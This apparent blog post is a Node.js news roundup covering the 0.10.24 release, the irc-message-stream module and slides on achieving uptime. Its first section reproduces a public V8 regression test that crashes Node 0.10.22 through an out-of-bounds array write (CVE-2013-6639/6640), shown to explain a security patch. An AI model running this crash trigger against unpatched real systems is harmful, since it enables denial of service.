---
layout: post
title: "Node Roundup: 0.10.24, irc-message-stream, 100% Uptime"
author: Alex Young
categories:
- node
- modules
- security
- talks
- slides
- irc
---

###Node 0.10.24 Released

[Node 0.10.24 was released](http://blog.nodejs.org/2013/12/19/node-v0-10-24-stable/) soon after 0.10.23.  It updates uv and npm, but presumably this release was due to [CVE-2013-6639](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6639) and [CVE-2013-6640](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6640).  These are security related patches for V8:

> ... allows remote attackers to cause a denial of service (out-of-bounds read) via JavaScript code that sets a variable to the value of an array element with a crafted index

If you run [this example](https://code.google.com/p/v8/source/browse/branches/bleeding_edge/test/mjsunit/regress/regress-crbug-319835.js?spec=svn17801&r=17801) in Node 0.10.22 you should see a segfault.

{% highlight javascript %}
var size = 0x20000;
var a = new Float64Array(size);
var training = new Float64Array(10);

function store(a, index) {
  var offset = 0x20000000;
  for (var i = 0; i < 1; i++) {
    a[index + offset] = 0xcc;
  }
}

store(training, -0x20000000);
store(training, -0x20000000 + 1);
store(training, -0x20000000);
store(training, -0x20000000 + 1);

for (var i = -0x20000000; i < -0x20000000 + size; i++) {
  store(a, i);
}
{% endhighlight %}

###irc-message-stream

irc-message (GitHub: [expr / irc-message](https://github.com/expr/irc-message), License: _BSD 2-Clause_, npm: [irc-message](https://npmjs.org/package/irc-message)) by [Fionn Kelleher](https://fionn.co/) is a small parser that outputs objects based on RFC1459.  The author has used it to create [irc-message-stream](https://github.com/expr/irc-message-stream), which is a transform stream.

That means you can take a socket connection to an IRC server and pipe it through your own stream handlers:

{% highlight javascript %}
var net = require('net');
var MessageStream = require('irc-message-stream');
var messageStream = new MessageStream();

messageStream.on('line', function(line) {
  console.log('Raw line:', line);
});

messageStream.on('data', function(message) {
  console.log('Parsed message:', JSON.stringify(message));
});

var socket = net.connect(6667, 'irc.freenode.net');
socket.pipe(messageStream);
{% endhighlight %}

I think this is a great way to handle IRC in Node -- taking advantage of the newer streams API seems a lot more idiomatic than other approaches that I've seen (and made!).

###Towards 100% Uptime with Node

William sent in his slides for a talk called [Towards 100% Uptime with Node](http://sandinmyjoints.github.io/towards-100-pct-uptime).  The slides cover the difficulties of handling uncaught exceptions in a cluster of Node processes, and ensuring that every request has a response, even if it's to report an error.

One of the tips he mentions is to be able to generate errors on demand for development and staging.  I do this in my tests -- if critical paths are expected to throw exceptions, emit `'error'` events, or return error objects to callbacks, then all of these eventualities should be hit as part of automated testing.

The Node applications I work on for my day job are hosted on Heroku, and I've found you have to be extremely careful with code that throws errors and causes the process to stop.  Sometimes Heroku gets confused about the state of a process and won't gracefully restart it, so a worker just hangs for an undefined amount of time.  The way I stopped this was to fix all the bugs, which sounds like an obvious thing to say, but it took lots of log file archaeology.  Coincidentally, Heroku's default logging is inadequate, so you have to send logs to a syslog daemon somewhere, or a service like [Loggly](https://www.loggly.com/) (which I preferred to [Splunk](https://www.splunkstorm.com/)).
